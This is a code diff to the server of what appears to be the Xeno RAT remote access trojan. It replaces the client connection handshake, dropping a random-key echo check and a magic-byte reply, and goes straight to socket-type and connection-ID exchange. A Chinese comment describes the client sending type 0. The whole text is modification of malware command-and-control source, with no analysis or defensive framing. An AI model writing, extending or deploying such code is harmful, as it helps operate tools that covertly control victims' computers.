@@ -228,53 +228,35 @@ namespace xeno_rat_server
         {
             try
             {
-                byte[] randomKey = GetByteArray(100);
-                byte[] data;
-                if (!(await sock.SendAsync(randomKey)))
+                // 等待客户端建立连接，发送type=0
+                int type = await GetSocketType();
+                if (type > 2 || type < 0)
                 {
                     return false;
                 }
-                sock.SetRecvTimeout(10000);
-                data = await sock.ReceiveAsync();
-                if (data == null)
+                if (type == 0)
                 {
-                    return false;
-                }
-                if (ByteArrayCompare(randomKey, data))
-                {
-                    if (!(await sock.SendAsync(new byte[] { 109, 111, 111, 109, 56, 50, 53 })))
+                    byte[] sockId = sock.IntToBytes(id);
+                    ID = id;
+                    if (!(await sock.SendAsync(sockId)))
                     {
                         return false;
                     }
-                    int type = await GetSocketType();
-                    if (type > 2 || type < 0)
+                }
+                else
+                {
+                    byte[] data = await sock.ReceiveAsync();
+                    if (data == null)
                     {
+                        Disconnect();
                         return false;
                     }
-                    if (type == 0)
-                    {
-                        byte[] sockId = sock.IntToBytes(id);
-                        ID = id;
-                        if (!(await sock.SendAsync(sockId)))
-                        {
-                            return false;
-                        }
-                    }
-                    else
-                    {
-                        data = await sock.ReceiveAsync();
-                        if (data == null)
-                        {
-                            Disconnect();
-                            return false;
-                        }
-                        int sockId = sock.BytesToInt(data);
-                        ID = sockId;
-                    }
-                    SockType = type;
-                    sock.ResetRecvTimeout();
-                    return true;
+                    int sockId = sock.BytesToInt(data);
+                    ID = sockId;
                 }
+                SockType = type;
+                sock.ResetRecvTimeout();
+                return true;
             }
             catch { }
             return false;
